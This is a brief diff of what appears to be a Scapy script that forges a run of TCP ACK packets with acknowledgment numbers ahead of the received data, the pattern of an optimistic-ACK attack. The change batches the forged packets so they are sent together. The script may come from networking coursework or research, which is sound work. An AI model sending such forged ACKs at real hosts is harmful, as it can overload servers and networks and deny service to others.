@@ -32,7 +32,10 @@ if __name__ == "__main__":
 
     OPT_ACK_START = data.seq + 1
     ACK_SPACING = 1000
+    pkt_list = []
     for i in range(100):
         opt_ack = ip_header / TCP(sport=args.sport, dport=args.dport, flags='A', ack=(OPT_ACK_START + i * ACK_SPACING), seq=(SEQ + 1))
-        send(opt_ack)
+        pkt_list.append(opt_ack)
+    
+    send(pkt_list)
 
